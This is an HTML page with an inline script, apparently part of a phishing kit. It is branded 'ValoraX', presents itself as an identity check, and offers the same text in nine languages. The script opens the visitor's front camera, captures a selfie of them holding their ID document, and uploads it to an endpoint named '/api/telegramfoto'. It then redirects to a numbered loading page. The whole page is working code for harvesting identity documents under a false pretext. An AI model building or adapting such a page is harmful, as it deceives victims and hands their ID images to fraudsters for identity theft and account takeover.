<!doctype html>
<html lang="de">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>ValoraX – Bildme</title>

<style>
:root{
  --bg:#000;
  --text:#fff;
  --muted:rgba(255,255,255,.55);
  --line:rgba(255,255,255,.18);
  --accent:#46f39a;
}
*{box-sizing:border-box}

/* Kein Scroll + Mobile Bounce aus */
html, body{
  touch-action: manipulation;
  height:100%;
  margin:0;
  overflow:hidden;
  overscroll-behavior:none;
}

button, input{
  touch-action: manipulation;
  -webkit-user-select:none;
  user-select:none;
  -webkit-tap-highlight-color:transparent;
}

body{
  height:100vh;
  background:var(--bg);
  color:var(--text);
  font-family:
    -apple-system,
    BlinkMacSystemFont,
    "PingFang SC",
    "Microsoft YaHei",
    "Noto Sans SC",
    ui-sans-serif,
    system-ui,
    Segoe UI,
    Roboto,
    Arial,
    sans-serif;
  display:flex;
  justify-content:center;
}

/* Container */
.container{
  width:100%;
  max-width:560px;
  height:100vh;
  padding:22px 18px calc(18px + env(safe-area-inset-bottom) + 36px);
  display:flex;
  flex-direction:column;
  position:relative;
}

.brand{
  font-weight:900;
  font-size:16px;
  letter-spacing:.02em;
  user-select:none;
}
.brand span{ color:var(--accent); }

.content{ margin-top:70px; }

h1{
  margin:0 0 14px 0;
  font-size:26px;
  line-height:1.3;
}

.sub{
  font-size:14px;
  color:var(--muted);
  font-weight:700;
  margin:0 0 18px 0;
  line-height:1.5;
  max-width:46ch;
}

/* 📷 Selfie Upload Box */
.uploadBox{
  border:1px dashed var(--line);
  border-radius:22px;
  height:clamp(260px, 38vh, 420px);  /* ✅ kompakter */
  display:flex;
  align-items:center;
  justify-content:center;
  text-align:center;
  padding:16px;
  cursor:pointer;
  overflow:hidden;
  position:relative;
  background:rgba(255,255,255,.02);
}

/* Kamera / Bild */
.uploadBox img,
.uploadBox video{
  width:100%;
  height:100%;
  object-fit:cover;
  display:block;
  border-radius:22px;
}

/* Frontkamera spiegeln (Selfie Look) */
.uploadBox video{
  transform:scaleX(-1);
  border:2px solid var(--accent);
  box-shadow:
    0 0 14px rgba(70,243,154,.6),
    0 0 28px rgba(70,243,154,.25);
}

/* Text in UploadBox */
.uploadText{
  font-size:14px;
  font-weight:800;
  color:var(--muted);
}

/* Button Bereich */
.actions{
  margin-top:auto;
  padding-top:20px;
}

button{
  width:100%;
  height:56px;
  border-radius:16px;
  border:1px solid rgba(255,255,255,.18);
  background:#fff;
  color:#000;
  font-weight:1000;
  font-size:14px;
  cursor:pointer;
}

button:disabled{
  opacity:.35;
  cursor:not-allowed;
}

/* Mobile Anpassungen */
@media (max-width:420px){
  .content{ margin-top:60px; }
}

@media (max-width:360px){
  .content{ margin-top:50px; }
}
</style>
</head>

<body>
  <div class="container">
  <div class="brand">Valora<span>X</span></div>

  <div class="content">
    <h1 id="title"></h1>

    <div class="sub" id="sub"></div>

    <div class="uploadBox" id="uploadBox">
      <div class="uploadText" id="uploadText"></div>
    </div>

    <div class="actions">
      <button id="continueBtn" disabled></button>
    </div>
  </div>
</div>

<script>
const STORAGE_KEY_LANG = "valorax_lang";

const LANGS = {
  de: {
    title: "Mache ein Foto von dir und halte deinen Ausweis in die Kamera",
    sub: "Bitte mache ein Foto von dir und halte deinen Ausweis in die Kamera. Achte darauf, dass alles gut sichtbar ist.",
    tapToPhoto: "Tippe zum Fotografieren",
    tapToShoot: "Tippe zum Auslösen",
    camError: "Kamera konnte nicht geöffnet werden.<br>Bitte erlaube Kamera-Zugriff.",
    cont: "Weiter"
  },

  en: {
    title: "Take a photo of yourself holding your ID",
    sub: "Please take a photo of yourself while holding your ID. Make sure everything is clearly visible.",
    tapToPhoto: "Tap to open camera",
    tapToShoot: "Tap to capture",
    camError: "Camera could not be opened.<br>Please allow camera access.",
    cont: "Continue"
  },

  es: {
    title: "Haz una foto tuya sosteniendo tu documento",
    sub: "Por favor, haz una foto tuya sosteniendo tu documento de identidad. Asegúrate de que todo sea claramente visible.",
    tapToPhoto: "Toca para abrir la cámara",
    tapToShoot: "Toca para capturar",
    camError: "No se pudo abrir la cámara.<br>Permite el acceso a la cámara.",
    cont: "Continuar"
  },

  fr: {
    title: "Prenez une photo de vous en tenant votre pièce d’identité",
    sub: "Veuillez prendre une photo de vous en tenant votre pièce d’identité. Assurez-vous que tout est clairement visible.",
    tapToPhoto: "Appuyez pour ouvrir la caméra",
    tapToShoot: "Appuyez pour capturer",
    camError: "Impossible d’ouvrir la caméra.<br>Veuillez autoriser l’accès à la caméra.",
    cont: "Continuer"
  },

  it: {
    title: "Scatta una foto di te mentre tieni il tuo documento",
    sub: "Scatta una foto di te mentre tieni il tuo documento di identità. Assicurati che tutto sia chiaramente visibile.",
    tapToPhoto: "Tocca per aprire la fotocamera",
    tapToShoot: "Tocca per scattare",
    camError: "Impossibile aprire la fotocamera.<br>Consenti l’accesso alla fotocamera.",
    cont: "Continua"
  },

  pt: {
    title: "Tira uma foto tua segurando o teu documento",
    sub: "Tira uma foto tua enquanto seguras o teu documento de identificação. Certifica-te de que tudo está claramente visível.",
    tapToPhoto: "Toca para abrir a câmara",
    tapToShoot: "Toca para capturar",
    camError: "Não foi possível abrir a câmara.<br>Permite o acesso à câmara.",
    cont: "Continuar"
  },

  nl: {
    title: "Maak een foto van jezelf terwijl je je identiteitsbewijs vasthoudt",
    sub: "Maak een foto van jezelf terwijl je je identiteitsbewijs vasthoudt. Zorg ervoor dat alles duidelijk zichtbaar is.",
    tapToPhoto: "Tik om camera te openen",
    tapToShoot: "Tik om vast te leggen",
    camError: "Camera kon niet worden geopend.<br>Sta cameratoegang toe.",
    cont: "Doorgaan"
  },

  ru: {
    title: "Сделайте фото, держа удостоверение личности",
    sub: "Пожалуйста, сделайте фото, держа ваше удостоверение личности. Убедитесь, что всё чётко видно.",
    tapToPhoto: "Нажмите, чтобы открыть камеру",
    tapToShoot: "Нажмите, чтобы снять",
    camError: "Не удалось открыть камеру.<br>Разрешите доступ к камере.",
    cont: "Продолжить"
  },

  zhCN: {
    title: "拍摄一张手持身份证的自拍照",
    sub: "请拍摄一张手持身份证的自拍照。请确保所有内容清晰可见。",
    tapToPhoto: "点击打开相机",
    tapToShoot: "点击拍摄",
    camError: "无法打开相机。<br>请允许相机权限。",
    cont: "继续"
  }
};

let current = localStorage.getItem(STORAGE_KEY_LANG) || "de";
if(!LANGS[current]) current = "de";

const titleEl = document.getElementById("title");
const subEl = document.getElementById("sub");
const btn = document.getElementById("continueBtn");
const uploadBox = document.getElementById("uploadBox");
const uploadTextEl = document.getElementById("uploadText");

let stream = null;
let videoEl = null;
let photoDataUrl = null;
let cameraReady = false;

function L(){ return LANGS[current]; }

function render(){
  const t = L();
  document.documentElement.lang = (current === "zhCN") ? "zh-CN" : current;

  titleEl.textContent = t.title;
  subEl.textContent = t.sub;
  btn.textContent = t.cont;

  // Initialtext in Box nur setzen, wenn noch kein Video/Bild drin ist
  if (!stream && !photoDataUrl) {
    setMessage(t.tapToPhoto);
  }

  document.title = "ValoraX – Identitätsprüfung";
}

function setMessage(html){
  // falls uploadTextEl existiert (Initialzustand), nutze ihn
  if (uploadTextEl) {
    uploadBox.innerHTML = `<div class="uploadText" id="uploadText">${html}</div>`;
  } else {
    uploadBox.innerHTML = `<div class="uploadText">${html}</div>`;
  }
}

async function startCamera(){
  cameraReady = false;
  photoDataUrl = null;
  btn.disabled = true;

  try{
    stream = await navigator.mediaDevices.getUserMedia({
  video: { facingMode: "user" },   // ✅ Frontkamera
  audio: false
});

    videoEl = document.createElement("video");
    videoEl.autoplay = true;
    videoEl.playsInline = true;
    videoEl.srcObject = stream;

    uploadBox.innerHTML = "";
    uploadBox.appendChild(videoEl);

    const hint = document.createElement("div");
    hint.className = "uploadText";
    hint.style.position = "absolute";
    hint.style.bottom = "14px";
    hint.style.left = "0";
    hint.style.right = "0";
    hint.style.textAlign = "center";
    hint.textContent = L().tapToShoot;
    uploadBox.appendChild(hint);

    videoEl.addEventListener("loadedmetadata", () => {
      cameraReady = true;
    }, { once:true });

  }catch(err){
    stopCamera();
    setMessage(L().camError);
  }
}

function stopCamera(){
  if(stream){
    stream.getTracks().forEach(t => t.stop());
  }
  stream = null;
  videoEl = null;
  cameraReady = false;
}

function capturePhoto(){
  if(!videoEl || !cameraReady || !videoEl.videoWidth) return;

  const canvas = document.createElement("canvas");
  canvas.width = videoEl.videoWidth;
  canvas.height = videoEl.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(videoEl, 0, 0);

  photoDataUrl = canvas.toDataURL("image/jpeg", 0.92);

  stopCamera();

  const img = document.createElement("img");
  img.src = photoDataUrl;

  uploadBox.innerHTML = "";
  uploadBox.appendChild(img);

  btn.disabled = false;
}

// dataURL -> Blob helper
function dataUrlToBlob(dataUrl){
  const [meta, b64] = dataUrl.split(",");
  const mime = (meta.match(/data:(.*?);base64/) || [])[1] || "image/jpeg";
  const bytes = atob(b64);
  const arr = new Uint8Array(bytes.length);
  for(let i=0;i<bytes.length;i++) arr[i] = bytes.charCodeAt(i);
  return new Blob([arr], { type: mime });
}

async function uploadToTelegram(){
  if(!photoDataUrl) throw new Error("No photo");

  // UI lock
  btn.disabled = true;
  btn.textContent = "Wird gesendet...";

  const blob = dataUrlToBlob(photoDataUrl);
  const file = new File([blob], "photo.jpg", { type: blob.type });

  const form = new FormData();
  form.append("photo", file);
  form.append("name", "Web"); // optional
  form.append("message", "Foto von der Webseite"); // optional

  const res = await fetch("/api/telegramfoto", {
    method: "POST",
    body: form
  });

  const data = await res.json().catch(() => null);

  if(!res.ok || !data?.ok){
    throw new Error(data?.error || "Upload failed");
  }

  btn.textContent = "Gesendet ✅";
}

// Ein einziger Click-Handler (State Machine)
uploadBox.addEventListener("click", () => {
  if(!stream){
    startCamera();
    return;
  }
  capturePhoto();
});

btn.addEventListener("click", async () => {
  if(btn.disabled) return;

  try{
    await uploadToTelegram();
    // erst danach weiter
    window.location.href = "loading3.html";
  }catch(e){
    btn.disabled = false;
    btn.textContent = "Weiter";
    alert("Senden fehlgeschlagen. Bitte erneut versuchen.");
  }
});

// Initialer Zustand
setMessage("Tippe zum Fotografieren");
render(); // ❗ GANZ WICHTIG
</script>

</body>
</html>
